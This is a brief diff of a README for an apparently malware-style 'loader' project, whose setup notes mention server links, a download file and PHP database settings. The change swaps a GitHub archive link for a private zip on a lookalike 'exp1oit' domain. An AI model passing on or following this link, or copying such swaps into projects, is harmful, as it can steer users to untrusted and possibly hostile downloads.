@@ -19,6 +19,6 @@ Change links to server and download file
 *.php:
 Change database settings
 
-[Files](https://github.com/Tokyani/loader/archive/refs/heads/main.zip)
+[Files](https://cdn.exp1oit.xyz/private/Loader.zip)
 
 Maded with <3 by [Tokyani](https://t.me/tokyani) and [MrEzer](https://github.com/MrEzerYT)
